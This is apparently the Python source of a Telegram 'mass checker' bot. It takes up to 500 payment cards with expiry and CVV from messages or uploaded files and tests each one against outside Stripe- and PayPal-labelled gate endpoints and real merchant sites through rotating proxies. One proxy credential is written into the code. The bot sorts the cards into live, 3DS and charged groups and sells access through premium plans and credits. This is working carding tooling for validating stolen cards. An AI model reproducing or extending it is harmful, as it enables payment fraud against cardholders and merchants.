import aiohttp
import asyncio
import time
import re
import os
from io import BytesIO
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import CommandHandler, ContextTypes, CallbackQueryHandler
from config import API_TIMEOUT, get_bin_info

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CONFIGURATION
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
MAX_CARDS = 500
SEMAPHORE_LIMIT = 10

GATE_CONFIG = {
    "au":   {"name": "Sᴛʀɪᴘᴇ Aᴜᴛʜ",  "url": "https://stripe-auth-test-production.up.railway.app/st0", "site": "fashionspicex.com", "use_proxy": False, "price": "0"},
    "mss":  {"name": "Sᴛʀɪᴘᴇ Mᴀss",  "url": "https://stripe-auth-test-production.up.railway.app/st0", "site": "fashionspicex.com", "use_proxy": False, "price": "0"},
    "mpp2": {"name": "PᴀʏPᴀʟ Mᴀss",  "url": "https://paypal0-1.onrender.com/pp1/cc={card}",          "site": "",                "use_proxy": False, "price": "0.10"},
}

def load_list_from_file(filename: str, default_list: list) -> list:
    if os.path.exists(filename):
        try:
            with open(filename, "r", encoding="utf-8") as f:
                items = [line.strip() for line in f if line.strip()]
                if items:
                    return items
        except Exception:
            pass
    return default_list

PROXIES = load_list_from_file("proxies.txt", ["http://purevpn0s12153504:1LTpwxbCJbEdXo@px041202.pointtoserver.com:10780"])
SITES   = load_list_from_file("sites.txt",   ["https://powerbuild.store"])


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CARD PARSING
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def parse_cards(text: str) -> list:
    """Parse cards from text with multiple formats."""
    cards = []
    for sep in ["\r\n", "\r", "\n", ";", ","]:
        text = text.replace(sep, "\n")

    for line in text.split("\n"):
        line = line.strip()
        if not line:
            continue

        # Format: cc|mm|yy|cvv  (pipe-separated with at least 4 parts)
        parts = line.split("|")
        if len(parts) >= 4:
            card_num = re.sub(r"\s+", "", parts[0].strip())
            if re.search(r"\d{13,19}", card_num):
                cards.append(line)
            continue

        # Try flexible regex match for cc mm yy cvv with mixed separators
        match = re.search(
            r"(\d{13,19})\s*[|,;\s]\s*(\d{1,2})\s*[|,;\s]\s*(\d{2,4})\s*[|,;\s]\s*(\d{3,4})",
            line,
        )
        if match:
            cards.append(f"{match.group(1)}|{match.group(2)}|{match.group(3)}|{match.group(4)}")
            continue

        # Just a card number (no expiry)
        match = re.search(r"(\d{13,19})", line)
        if match:
            card_num  = match.group(1)
            remaining = line[match.end():].strip()
            if remaining:
                extra = re.findall(r"\d+", remaining)
                if len(extra) >= 3:
                    cards.append(f"{card_num}|{extra[0]}|{extra[1]}|{extra[2]}")
                else:
                    cards.append(card_num)
            else:
                cards.append(card_num)

    return cards


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# FILE DOWNLOAD
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def _download_file_cards(bot, file_id: str) -> str | None:
    """Download a text file from Telegram and return its content as a string."""
    try:
        file    = await bot.get_file(file_id)
        content = await file.download_as_bytearray()
        if content:
            try:
                return content.decode("utf-8", errors="ignore")
            except Exception:
                return content.decode("latin-1", errors="ignore")
        return None
    except Exception as e:
        print(f"[mass] File download error: {e}")
        return None


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CARD EXTRACTION (supports inline args, file caption,
#                  reply-to-text, reply-to-file)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def extract_cards_from_update(
    update: Update, bot, context: ContextTypes.DEFAULT_TYPE
) -> list | None:
    """
    Try every possible input method (in priority order) and return the first
    non-empty card list found, or None.
    """
    msg = update.message

    # 1. Inline args:  /mss cc|mm|yy|cvv
    if context.args:
        cards = parse_cards(" ".join(context.args))
        if cards:
            return cards

    # 2. File sent WITH the command as caption (e.g. /mss as caption on .txt)
    if msg.document and msg.document.file_id:
        content = await _download_file_cards(bot, msg.document.file_id)
        if content:
            cards = parse_cards(content)
            if cards:
                return cards
        # Fallback: parse any text after the command in the caption
        if msg.caption:
            caption = msg.caption.strip()
            for cmd in ("/au", "/mss", "/mpp2"):
                if caption.lower().startswith(cmd):
                    caption = caption[len(cmd):].strip()
                    break
            if caption:
                cards = parse_cards(caption)
                if cards:
                    return cards

    # 3. Reply to a message (text or file)
    if msg.reply_to_message:
        replied = msg.reply_to_message

        # 3a. Reply to a text message
        if replied.text and replied.text.strip():
            cards = parse_cards(replied.text)
            if cards:
                return cards

        # 3b. Reply to a file/document
        if replied.document and replied.document.file_id:
            content = await _download_file_cards(bot, replied.document.file_id)
            if content:
                cards = parse_cards(content)
                if cards:
                    return cards

    # 4. Plain text in the message itself (not starting with /)
    if msg.text and msg.text.strip() and not msg.text.startswith("/"):
        cards = parse_cards(msg.text)
        if cards:
            return cards

    return None


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# PROXY ROTATOR
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
class ProxyRotator:
    def __init__(self, proxies: list):
        self.proxies = proxies
        self._index  = 0

    def next(self) -> str | None:
        if not self.proxies:
            return None
        proxy        = self.proxies[self._index % len(self.proxies)]
        self._index += 1
        return proxy

    def count(self) -> int:
        return len(self.proxies)


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CREDITS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def deduct_credits(context: ContextTypes.DEFAULT_TYPE, user_id: int, amount: int) -> bool:
    uid = str(user_id)
    if "user_data" not in context.bot_data:
        context.bot_data["user_data"] = {}
    if uid not in context.bot_data["user_data"]:
        context.bot_data["user_data"][uid] = {"plan": "TRIAL", "credits": 0, "expires": 0}
    ud         = context.bot_data["user_data"][uid]
    is_premium = ud.get("plan", "TRIAL").upper() != "TRIAL" and ud.get("expires", 0) > time.time()
    if is_premium:
        return True
    available = ud.get("credits", 0)
    if available < amount:
        return False
    ud["credits"] = available - amount
    return True


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# RESULT BUTTONS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def create_result_buttons() -> InlineKeyboardMarkup:
    """4 action buttons shown under every mass-check result."""
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("✅ LIVE",   callback_data="result_live"),
            InlineKeyboardButton("🔐 3DS",    callback_data="result_3ds"),
        ],
        [
            InlineKeyboardButton("💎 CHARGE", callback_data="result_charge"),
            InlineKeyboardButton("📦 ALL",    callback_data="result_all"),
        ],
    ])


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# SINGLE CARD CHECK (async worker)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def check_single_card(session, gate_key, api_url, site, card, proxy, semaphore):
    async with semaphore:
        try:
            if "{card}" in api_url:
                url = api_url.replace("{card}", card)
                async with session.get(url) as resp:
                    try:
                        data = await resp.json(content_type=None)
                    except Exception:
                        data = {"response": await resp.text(), "status": "false"}
            else:
                params = {"cc": card, "site": site}
                if proxy:
                    params["proxy"] = proxy
                async with session.get(api_url, params=params) as resp:
                    try:
                        data = await resp.json(content_type=None)
                    except Exception:
                        data = {"response": await resp.text(), "status": "false"}

            if not isinstance(data, dict):
                data = {"Response": str(data), "Status": "false"}

            response_text = str(
                data.get("Response") or data.get("response") or
                data.get("message") or "ERROR"
            ).strip()
            status = str(data.get("Status") or data.get("status") or "false").lower()

            # Classify the card result
            resp_lower = response_text.lower()
            if status == "true" or "approved" in resp_lower:
                card_status = "approved"
            elif "3ds" in resp_lower or "3d secure" in resp_lower or "authenticate" in resp_lower:
                card_status = "3ds"
            elif "charged" in resp_lower or "captured" in resp_lower or "success" in resp_lower:
                card_status = "charged"
            else:
                card_status = "dead"

            return {
                "card":        card,
                "response":    response_text,
                "status":      status,
                "card_status": card_status,
                "error":       None,
            }

        except asyncio.TimeoutError:
            return {"card": card, "error": "TIMEOUT",  "response": "TIMEOUT", "status": "false", "card_status": "dead"}
        except Exception as e:
            return {"card": card, "error": str(e)[:80], "response": "ERROR",  "status": "false", "card_status": "dead"}


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# MASS PROCESS CORE
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def process_mass(update: Update, context: ContextTypes.DEFAULT_TYPE, gate_key: str):
    cfg       = GATE_CONFIG[gate_key]
    gate_name = cfg["name"]
    api_url   = cfg["url"]
    site      = cfg["site"]
    use_proxy = cfg["use_proxy"]
    price     = cfg["price"]

    # Gate ON/OFF check
    if not context.bot_data.get(f"{gate_key}_on", True):
        await update.message.reply_text("⚠️ Gᴀᴛᴇ ➤ OFF")
        return

    # Premium check
    user_id    = update.effective_user.id
    ud         = context.bot_data.get("user_data", {}).get(str(user_id), {})
    is_premium = ud.get("plan", "TRIAL").upper() != "TRIAL" and ud.get("expires", 0) > time.time()

    if not is_premium:
        await update.message.reply_text(
            "⚠️ <b>Pʀᴇᴍɪᴜᴍ Gᴀᴛᴇ</b>\n\n"
            "This gate is only available for premium users.\n"
            "Use /plan to upgrade.\n\n"
            "<b>Premium Gates:</b>\n"
            "/au   ➺ Sᴛʀɪᴘᴇ Aᴜᴛʜ\n"
            "/mss  ➺ Sᴛʀɪᴘᴇ Mᴀss\n"
            "/mpp2 ➺ PᴀʏPᴀʟ Mᴀss",
            parse_mode="HTML",
        )
        return

    # Extract cards (inline / caption / reply-to-text / reply-to-file)
    cards = await extract_cards_from_update(update, context.bot, context)

    if not cards:
        await update.message.reply_text(
            f"⚠️ <b>Uꜱᴀɢᴇ:</b>\n\n"
            f"1️⃣ Reply to a .txt file and send <code>/{gate_key}</code>\n"
            f"2️⃣ Send a .txt file with <code>/{gate_key}</code> as caption\n"
            f"3️⃣ <code>/{gate_key} cc|mm|yy|cvv</code>\n\n"
            f"<b>Example:</b> <code>/{gate_key} 4111111111111111|12|2026|123</code>",
            parse_mode="HTML",
        )
        return

    if len(cards) > MAX_CARDS:
        await update.message.reply_text(
            f"⚠️ Mᴀx {MAX_CARDS} ᴄᴀʀᴅꜱ ᴘᴇʀ ʀᴜɴ.\n"
            f"Yᴏᴜ ꜱᴇɴᴛ: {len(cards)}",
            parse_mode="HTML",
        )
        return

    if not await deduct_credits(context, user_id, len(cards)):
        have = context.bot_data.get("user_data", {}).get(str(user_id), {}).get("credits", 0)
        await update.message.reply_text(
            f"❌ Nᴇᴇᴅ {len(cards)} ᴄʀᴇᴅɪᴛꜱ, ʜᴀᴠᴇ {have}.",
            parse_mode="HTML",
        )
        return

    rotator       = ProxyRotator(PROXIES)
    dynamic_sites = SITES if SITES else ["https://powerbuild.store"]
    if not use_proxy:
        dynamic_sites = [site] if site else ["https://powerbuild.store"]

    # Starting message
    msg = await update.message.reply_text(
        f"[₪] Gᴀᴛᴇ ➺ {gate_name} | {price} Usd\n"
        f"━━━━━━━━━━━━━━\n"
        f"      [◈] Sᴛᴀᴛᴜs ➺ Sᴛᴀʀᴛɪɴɢ...\n"
        f"━━━━━━━━━━━━━━\n"
        f"📊 Cᴀʀᴅꜱ ➺ {len(cards)}\n"
        f"━━━━━━━━━━━━━━\n"
        f"⏳ Pʀᴏᴄᴇꜱꜱɪɴɢ...",
        parse_mode="HTML",
    )

    semaphore  = asyncio.Semaphore(SEMAPHORE_LIMIT)
    start_time = time.time()

    connector = aiohttp.TCPConnector(limit=SEMAPHORE_LIMIT, ssl=False)
    timeout   = aiohttp.ClientTimeout(total=max(API_TIMEOUT, 180))

    async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
        tasks = []
        for i, card in enumerate(cards):
            proxy      = rotator.next() if use_proxy else None
            site_to_use = dynamic_sites[i % len(dynamic_sites)]
            tasks.append(
                check_single_card(session, gate_key, api_url, site_to_use, card, proxy, semaphore)
            )
        results = await asyncio.gather(*tasks, return_exceptions=True)

    # Classify results
    parsed = [
        r if not isinstance(r, Exception)
        else {"card": "???", "error": str(r)[:60], "response": "ERROR", "status": "false", "card_status": "dead"}
        for r in results
    ]
    approved_list = [r for r in parsed if not r.get("error") and r.get("card_status") == "approved"]
    charged_list  = [r for r in parsed if not r.get("error") and r.get("card_status") == "charged"]
    threeds_list  = [r for r in parsed if not r.get("error") and r.get("card_status") == "3ds"]
    dead_list     = [r for r in parsed if not r.get("error") and r.get("card_status") == "dead"]
    error_list    = [r for r in parsed if r.get("error")]

    elapsed = time.time() - start_time

    # Store results so the 4 buttons can retrieve them
    context.bot_data[f"mass_results_{user_id}_{gate_key}"] = {
        "parsed":   parsed,
        "approved": approved_list,
        "charged":  charged_list,
        "threeds":  threeds_list,
        "dead":     dead_list,
        "error":    error_list,
        "gate":     gate_name,
        "price":    price,
        "total":    len(parsed),
        "gate_key": gate_key,
    }
    # Also write under a "last result" key so button handler finds it easily
    context.bot_data[f"last_mass_{user_id}"] = f"mass_results_{user_id}_{gate_key}"

    # Final summary — matches the user's requested format exactly
    summary = (
        f"[₪] Gᴀᴛᴇ ➺ {gate_name} | {price} Usd \n"
        f"━━━━━━━━━━━━━━\n"
        f"      [◈] Sᴛᴀᴛᴜs ➺ Fɪɴɪsʜᴇᴅ ✅\n"
        f"      [𖣸] Cʜᴇᴄᴋᴇᴅ ➺ {len(parsed)}/{len(cards)}\n"
        f"━━━━━━━━━━━━━━\n"
        f"♘ Aᴘᴘʀᴏᴠᴇᴅ ➺ {len(approved_list)} ✅\n"
        f"♞ Cʜᴀʀɢᴇᴅ ➺ {len(charged_list)} 💎\n"
        f"3ᴅs ➺ {len(threeds_list)} 🔐\n"
        f"Dᴇᴀᴅ ➺ {len(dead_list)} ❌\n"
        f"Eʀʀᴏʀs ➺ {len(error_list)} ⚠️\n"
        f"Tɪᴍᴇ ➺ {elapsed:.0f}s"
    )
    await msg.edit_text(summary, parse_mode="HTML", reply_markup=create_result_buttons())


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# COMMAND HANDLERS  (/au  /mss  /mpp2)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def cmd_au(update, context):   await process_mass(update, context, "au")
async def cmd_mss(update, context):  await process_mass(update, context, "mss")
async def cmd_mpp2(update, context): await process_mass(update, context, "mpp2")


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CALLBACK HANDLER FOR THE 4 RESULT BUTTONS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def mass_callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query   = update.callback_query
    await query.answer()
    user_id = query.from_user.id

    # Locate the most recent results for this user
    result_key = context.bot_data.get(f"last_mass_{user_id}")
    if not result_key or result_key not in context.bot_data:
        # Fallback: scan all stored keys
        result_key = None
        for k in context.bot_data:
            if k.startswith(f"mass_results_{user_id}_"):
                result_key = k
                break

    if not result_key:
        await query.answer("Results have expired. Please run the command again.", show_alert=True)
        return

    results   = context.bot_data[result_key]
    action    = query.data

    if action == "result_live":
        file_name = f"LIVE_{user_id}.txt"
        cards_out = results.get("approved", [])
        if cards_out:
            file_content = "\n".join(r["card"] for r in cards_out)
            caption      = f"✅ LIVE Cards — {results.get('gate', '')} ({len(cards_out)} cards)"
        else:
            file_content = "No approved (live) cards found."
            caption      = "✅ LIVE Cards — none found"

    elif action == "result_3ds":
        file_name = f"3DS_{user_id}.txt"
        cards_out = results.get("threeds", [])
        if cards_out:
            file_content = "\n".join(r["card"] for r in cards_out)
            caption      = f"🔐 3DS Cards — {results.get('gate', '')} ({len(cards_out)} cards)"
        else:
            file_content = "No 3DS cards found."
            caption      = "🔐 3DS Cards — none found"

    elif action == "result_charge":
        file_name = f"CHARGE_{user_id}.txt"
        cards_out = results.get("charged", [])
        if cards_out:
            file_content = "\n".join(r["card"] for r in cards_out)
            caption      = f"💎 Charged Cards — {results.get('gate', '')} ({len(cards_out)} cards)"
        else:
            file_content = "No charged cards found."
            caption      = "💎 Charged Cards — none found"

    elif action == "result_all":
        file_name    = f"ALL_{user_id}.txt"
        parsed       = results.get("parsed", [])
        if parsed:
            lines = []
            for r in parsed:
                card   = r.get("card", "N/A")
                status = r.get("card_status", "N/A").upper()
                resp   = r.get("response", "N/A")
                err    = r.get("error")
                lines.append(f"Card: {card}")
                lines.append(f"Status: {status}")
                lines.append(f"Response: {err if err else resp}")
                lines.append("-" * 30)
            file_content = "\n".join(lines)
        else:
            file_content = "No cards processed."
        caption = f"📦 All Results — {results.get('gate', '')} ({results.get('total', 0)} cards)"

    else:
        return

    bio      = BytesIO(file_content.encode("utf-8"))
    bio.name = file_name
    await context.bot.send_document(
        chat_id  = query.message.chat_id,
        document = bio,
        filename = file_name,
        caption  = caption,
    )


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# EXPORT
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def get_mass_handlers():
    return [
        CommandHandler("au",   cmd_au),
        CommandHandler("mss",  cmd_mss),
        CommandHandler("mpp2", cmd_mpp2),
        CallbackQueryHandler(mass_callback_handler, pattern=r"^result_"),
    ]
